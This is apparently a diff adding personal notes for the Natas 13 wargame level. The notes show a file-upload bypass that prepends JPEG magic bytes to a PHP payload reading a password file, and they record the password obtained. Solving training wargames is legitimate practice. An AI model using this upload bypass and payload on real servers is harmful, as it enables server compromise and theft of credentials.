@@ -1,0 +1,5 @@
+Here I checked on the file signature since the function that see if it is a real image checks for it and then put the script to give me the password
+https://en.wikipedia.org/wiki/List_of_file_signatures for jpg-jpeg signatures
+echo -e "\xff\xd8\xff\xee<?php require '/etc/natas_webpass/natas14';" > natas13.php // Added -e flag in order to interpretate \
+Upload the file as the last Level
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
